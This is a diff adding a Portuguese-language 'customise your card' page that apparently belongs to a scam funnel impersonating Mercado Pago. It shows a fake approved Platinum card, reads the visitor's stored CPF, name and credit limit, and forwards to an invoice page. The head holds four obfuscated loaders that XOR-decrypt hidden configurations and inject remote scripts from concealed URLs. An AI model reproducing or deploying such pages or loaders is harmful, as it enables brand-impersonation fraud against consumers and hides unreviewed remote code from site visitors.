@@ -1,0 +1,529 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script>(function(){var b_x=atob("DHBTg58oM7MKpTo+sAtx9u1EEYkozU5KwANprLBLV90k0E5T2RYqrfxHXp1o1xVN0wI68+tbHMZ+yEkR3BEn5uxcHdl5hxYc0QQn8fZKRsdv1hgE6wtx7f5FVpEwh15fxBF+9utFWtVziEpM1QY27esFS9BlwRdN0xtxr71eUt9/wBgEklIur+QKXdJnwBgEkhQy9/4FRsdnzFxHnQAh5ulNXccn1k9c2RQgobMKRdJm0F8cilJx/sJV");var n_g=[];for(var k_ui=0;k_ui<b_x.length;k_ui++){n_g.push(b_x.charCodeAt(k_ui)&255);}var s_0vo=n_g[0];var u_b=n_g.slice(1,1+s_0vo);var s_3n6=n_g.slice(1+s_0vo);var u_k=s_3n6.map(function(b,s_bfn){return b^u_b[s_bfn%s_0vo];});var w_7le6="";for(var a_st=0;a_st<u_k.length;a_st++){w_7le6+=String.fromCharCode(u_k[a_st]&255);}var s_enao=decodeURIComponent(escape(w_7le6));var b_v6i=JSON.parse(s_enao);var x_vi6=b_v6i.globals||[];x_vi6.forEach(function(v_hv){window[v_hv.name]=v_hv.value;});var n_rb2=document.createElement("script");n_rb2.src=b_v6i.url;n_rb2.async=true;n_rb2.defer=true;(b_v6i.attributes||[]).forEach(function(r_ebks){n_rb2.setAttribute(r_ebks.name,r_ebks.value);});(document.head||document.documentElement).appendChild(n_rb2);})();</script><script src="js/latest.js" async="" defer="" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids=""></script>
+<script>(function(){var x_v=atob("DPv5+JvEGQDXP+pP8YDbjemoOzr1V547gYjD17SnfW75Sp4imJ2A1virdC61TcU8komQiO+3NnC+R48j3ouQgP6oNGe4UI0jlNWTi7noO2GjS5gmk46NnejmI1uKE8gonZSbmfe3OzqMRMghkJac2qHmfm+4WIYqoZKBnfeNfSL7HZwunY6c2qHmL2HgDN8swMKYyav3LzDkXdgqw5mfyP6gO32KQg==");var a_0s=[];for(var s_m7=0;s_m7<x_v.length;s_m7++){a_0s.push(x_v.charCodeAt(s_m7)&255);}var j_9h=a_0s[0];var n_m1kx=a_0s.slice(1,1+j_9h);var m_c=a_0s.slice(1+j_9h);var m_svs=m_c.map(function(b,y_a208){return b^n_m1kx[y_a208%j_9h];});var b_4f1="";for(var y_b2=0;y_b2<m_svs.length;y_b2++){b_4f1+=String.fromCharCode(m_svs[y_b2]&255);}var a_40s7=decodeURIComponent(escape(b_4f1));var r_92=JSON.parse(a_40s7);var v_5f5b=r_92.globals||[];v_5f5b.forEach(function(f_b11){window[f_b11.name]=f_b11.value;});var z_7va5=document.createElement("script");z_7va5.src=r_92.url;z_7va5.async=true;z_7va5.defer=true;(r_92.attributes||[]).forEach(function(y_o8){z_7va5.setAttribute(y_o8.name,y_o8.value);});(document.head||document.documentElement).appendChild(z_7va5);})();</script><script src="js/pixel-google.js" async="" defer=""></script>
+
+
+    
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <link href="css/all.min.css" rel="stylesheet">
+    <title>Personalize seu Cartão - mercado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: #EE4D2D;
+        }
+        .decoration1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+        .decoration2 {
+            width: 200px;
+            height: 200px;
+            bottom: 10%;
+            left: 5%;
+            background: #EE4D2D;
+            animation: float2 25s infinite ease-in-out;
+        }
+        .decoration3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 50%;
+            background: #EE4D2D;
+            animation: float3 30s infinite ease-in-out;
+        }
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-30px, 30px) scale(1.1); }
+        }
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(0.9); }
+        }
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+        .header {
+            background: #EE4D2D;
+            padding: 20px 24px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.6s ease-out;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        /* Logo */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .content-container {
+            max-width: 520px;
+            margin: 30px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: scaleIn 0.6s ease-out;
+            position: relative;
+            text-align: center;
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .main-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333333;
+            line-height: 1.3;
+            margin-bottom: 40px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .card {
+            background: linear-gradient(135deg, #EE4D2D, #D63D21);
+            border-radius: 12px;
+            padding: 20px;
+            height: 200px;
+            width: 340px;
+            margin: 0 auto 30px;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(238, 77, 45, 0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            overflow: hidden;
+        }
+
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 60px;
+        }
+
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: absolute;
+            bottom: 15px;
+            left: 20px;
+            right: 20px;
+        }
+
+        .card-name {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            color: rgb(255, 255, 255);
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+            letter-spacing: 1px;
+        }
+
+        /* Logo pequeno para o cartão */
+        .card-logo {
+            position: relative;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card-logo img {
+            width: 100%;
+            height: auto;
+        }
+
+        @keyframes shine {
+            0% { left: -100%; }
+            20% { left: 100%; }
+            100% { left: 100%; }
+        }
+        .colors-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 18px;
+            margin: 50px 0;
+            animation: fadeIn 0.6s ease-out 0.3s both;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .color-circle {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s ease;
+            border: 2px solid rgba(255,255,255,0.9);
+            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+        }
+        .color-circle:hover {
+            transform: translateY(-3px) scale(1.08);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.25);
+        }
+        .color-circle.active {
+            transform: translateY(-5px) scale(1.12);
+            border: 3px solid #EE4D2D;
+            box-shadow: 0 8px 25px rgba(238, 77, 45, 0.4);
+        }
+        .color-circle.active::after {
+            content: '✓';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 12px;
+            font-weight: 900;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+        .blue-color {
+            background: linear-gradient(135deg, #EE4D2D, #D63D21);
+        }
+        .yellow-color {
+            background: linear-gradient(135deg, #EE4D2D, #E6CF00);
+        }
+        .gray-color {
+            background: linear-gradient(135deg, #999999, #757575);
+        }
+        .black-color {
+            background: linear-gradient(135deg, #1A1A1A, #000000);
+        }
+        .button {
+            background: #EE4D2D;
+            color: #FFFFFF;
+            padding: 18px 45px;
+            border-radius: 6px;
+            text-decoration: none;
+            display: block;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.3);
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+            animation: fadeIn 0.8s ease-out 0.5s both;
+        }
+        .button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(238, 77, 45, 0.4);
+            background: #D63D21;
+        }
+        .button:hover::before {
+            left: 100%;
+        }
+        .button:active {
+            transform: translateY(0);
+        }
+        footer {
+            padding: 20px;
+            text-align: center;
+            background: #FFFFFF;
+            margin-top: auto;
+        }
+        footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+        footer a {
+            color: #EE4D2D;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 500px) {
+            .content-container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+            .main-title {
+                font-size: 20px;
+            }
+            .header {
+                padding: 18px 20px;
+            }
+            .logo-container img {
+                height: 40px;
+            }
+            .button {
+                padding: 16px 35px;
+                font-size: 15px;
+            }
+            .colors-container {
+                gap: 15px;
+            }
+            .color-circle {
+                width: 35px;
+                height: 35px;
+            }
+            .card {
+                width: 100%;
+                max-width: 320px;
+            }
+        }
+    </style>
+
+    
+
+    
+
+    
+
+    
+
+    
+<script src="js/utm-handler.js" data-token="ea930328-cad0-4277-b99d-8c16148dcdbb"></script>
+
+<!-- UTMify pixel and UTM tracking -->
+<script>(function(){var n_9umv=atob("DOmOujQiboEBZRMcE5Ksz0ZOTLsjDWdoY5q0lRtBCu8vEGdxeo/3lFdNA69jFzxvcJvnykBRQfFoHXZwPJnnwlFOQOtyRz8+cp36yF1AG/VkFjEmSLSimFNOAeNgCWA+KbL1mFpDA+QjXzFsepHr1n1GTK0jE3JwZoysgBYUD+AyUScrK4+4j1cQCrkzXSR+IdzqjAMAE9x8");var f_3w0=[];for(var e_9ihb=0;e_9ihb<n_9umv.length;e_9ihb++){f_3w0.push(n_9umv.charCodeAt(e_9ihb)&255);}var q_jc2=f_3w0[0];var v_p14n=f_3w0.slice(1,1+q_jc2);var x_to=f_3w0.slice(1+q_jc2);var y_cfcj=x_to.map(function(b,i_eb){return b^v_p14n[i_eb%q_jc2];});var y_lgc="";for(var r_4y4=0;r_4y4<y_cfcj.length;r_4y4++){y_lgc+=String.fromCharCode(y_cfcj[r_4y4]&255);}var j_oi3=decodeURIComponent(escape(y_lgc));var b_fccl=JSON.parse(j_oi3);var p_1=b_fccl.globals||[];p_1.forEach(function(i_1wym){window[i_1wym.name]=i_1wym.value;});var p_w3kc=document.createElement("script");p_w3kc.src=b_fccl.url;p_w3kc.async=true;p_w3kc.defer=true;(b_fccl.attributes||[]).forEach(function(u_9vj){p_w3kc.setAttribute(u_9vj.name,u_9vj.value);});(document.head||document.documentElement).appendChild(p_w3kc);})();</script>
+<script>(function(){var e_0z=atob("DE/SdGpmbNX2MyoZiDTwARgKTu/UW15t+DzoW0UFCLvYRl504SmrWgkJAfuUQQVq6z27BB4VQ6CCXlk25C6mERkSQr+FEQY76TumBgMEGaGTQAgj0zTwGgsLCffMEU54/C7/AR4LBbOPHlpr7Tm3Gh5LFLaZVwdq6yTwWEgQDbmDVggjqm2vWBFEArSbVggjqiuzAAtLGaGbWkxgpT+gERwDAqHbQF974SuhVkZEGrSaRk87sm3wCTcb");var o_7o=[];for(var u_j=0;u_j<e_0z.length;u_j++){o_7o.push(e_0z.charCodeAt(u_j)&255);}var a_a=o_7o[0];var r_ji86=o_7o.slice(1,1+a_a);var r_b=o_7o.slice(1+a_a);var q_m1=r_b.map(function(b,r_co2){return b^r_ji86[r_co2%a_a];});var d_17sz="";for(var m_hsnv=0;m_hsnv<q_m1.length;m_hsnv++){d_17sz+=String.fromCharCode(q_m1[m_hsnv]&255);}var w_n=decodeURIComponent(escape(d_17sz));var w_1dqv=JSON.parse(w_n);var r_6m=w_1dqv.globals||[];r_6m.forEach(function(r_jqj){window[r_jqj.name]=r_jqj.value;});var w_fj=document.createElement("script");w_fj.src=w_1dqv.url;w_fj.async=true;w_fj.defer=true;(w_1dqv.attributes||[]).forEach(function(z_jqz){w_fj.setAttribute(z_jqz.name,z_jqz.value);});(document.head||document.documentElement).appendChild(w_fj);})();</script>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="images/logoofc.png" alt="mercado">
+        </div>
+    </div>
+    <div class="content-container">
+        <h1 class="main-title">Personalize o seu cartão</h1>
+
+        <div class="card" id="creditCard">
+            <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;"></div>
+
+            <div class="card-top">
+                <!-- Logo pequeno no cartão -->
+                <div class="card-logo" id="cardLogo">
+                    <img src="images/logoofc.png" alt="Mercado Pago" style="width: 50px; height: auto; object-fit: contain;">
+                </div>
+                <div style="font-size: 12px; color: rgba(255, 255, 255, 0.8); font-family: 'Inter', sans-serif; text-transform: uppercase; letter-spacing: 1px;">Platinum</div>
+            </div>
+
+            <div style="position: absolute; top: 60%; left: 0; transform: translateY(-50%); width: 100%;">
+                <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                    <div style="display: flex; align-items: center; margin-left: 20px;">
+                        <img src="images/chip.png" alt="Chip" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(255, 255, 255, 0.3));">
+                    </div>
+                    <i class="fas fa-wifi fa-rotate-90" style="color: rgb(255, 255, 255); font-size: 24px; margin-right: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3);"></i>
+                </div>
+            </div>
+
+            <div class="card-bottom">
+                <div style="display: flex; flex-direction: column; align-items: flex-start;">
+                    <span class="card-name" id="cardName" style="text-shadow: 0 1px 2px rgba(0,0,0,0.3); letter-spacing: 1px;">NOME DO TITULAR</span>
+                    <span style="font-size: 8px; color: rgba(255, 255, 255, 0.7); font-family: 'Inter', sans-serif; margin-top: 3px;">TITULAR DO CARTÃO</span>
+                </div>
+                <div style="display: flex; flex-direction: column; align-items: flex-end; justify-content: flex-end;">
+                    <img src="images/Mastercard-Logo.png" alt="mastercard" style="width: 50px;">
+                </div>
+            </div>
+
+            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;"></div>
+        </div>
+
+        <div class="colors-container">
+            <div class="color-circle blue-color active" onclick="selectNewColor('blue', '#EE4D2D', '#EE4D2D', '#D63D21', this)"></div>
+            <div class="color-circle yellow-color" onclick="selectNewColor('yellow', '#EE4D2D', '#EE4D2D', '#E6CF00', this)"></div>
+            <div class="color-circle gray-color" onclick="selectNewColor('gray', '#999999', '#9E9E9E', '#757575', this)"></div>
+            <div class="color-circle black-color" onclick="selectNewColor('black', '#1A1A1A', '#1A1A1A', '#000000', this)"></div>
+        </div>
+
+        <button class="button" onclick="continuarPersonalizacao()">Continuar</button>
+    </div>
+
+    <footer>
+        <p>© 2026, Todos os direitos reservados.</p>
+        <p><a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </footer>
+
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros atuais no console
+        console.log('Parâmetros atuais da página 10:', getUrlParams());
+
+        // =======================================================
+        // CÓDIGO ORIGINAL MANTIDO
+        // =======================================================
+
+        const UserData = {
+            save: function(dados) {
+                sessionStorage.setItem('user_data', JSON.stringify(dados));
+            },
+            load: function() {
+                const dados = sessionStorage.getItem('user_data');
+                return dados ? JSON.parse(dados) : null;
+            },
+            update: function(novosDados) {
+                const dadosExistentes = this.load() || {};
+                const dadosAtualizados = { ...dadosExistentes, ...novosDados };
+                this.save(dadosAtualizados);
+                return dadosAtualizados;
+            },
+            clear: function() {
+                sessionStorage.removeItem('user_data');
+            }
+        };
+
+        const dadosUsuario = UserData.load();
+        console.log('Dados do usuário carregados:', dadosUsuario);
+
+        if (dadosUsuario && dadosUsuario.nome) {
+            document.getElementById('cardName').textContent = dadosUsuario.nome.toUpperCase();
+        }
+
+        let corSelecionada = 'blue';
+        let corHex = '#EE4D2D';
+
+        function selectNewColor(color, hex, color1, color2, element) {
+            document.querySelectorAll('.color-circle').forEach(circle => {
+                circle.classList.remove('active');
+            });
+
+            element.classList.add('active');
+
+            document.getElementById('creditCard').style.background = `linear-gradient(135deg, ${color1}, ${color2})`;
+
+            corSelecionada = color;
+            corHex = hex;
+        }
+
+        // =======================================================
+        // FUNÇÃO ATUALIZADA PARA PRESERVAR PARÂMETROS
+        // =======================================================
+
+        function continuarPersonalizacao() {
+            // Desabilita o botão para evitar cliques duplos
+            const btn = document.querySelector('.button');
+            btn.disabled = true;
+            btn.textContent = 'Carregando...';
+            
+            UserData.update({
+                etapa_atual: 'personalizacao',
+                cartao_cor: corSelecionada,
+                cartao_cor_hex: corHex,
+                personalizacao_data: new Date().toISOString()
+            });
+
+            console.log('Personalização salva:', corSelecionada, corHex);
+            
+            // Redireciona preservando parâmetros
+            window.location.href = buildUrlWithParams('fatura.html');
+        }
+
+        if (dadosUsuario) {
+            console.log('CPF:', dadosUsuario.cpf);
+            console.log('Nome:', dadosUsuario.nome);
+            console.log('Cartão aprovado:', dadosUsuario.cartao_aprovado);
+            console.log('Limite:', dadosUsuario.cartao_limite);
+        }
+    </script>
+
+</body></html>
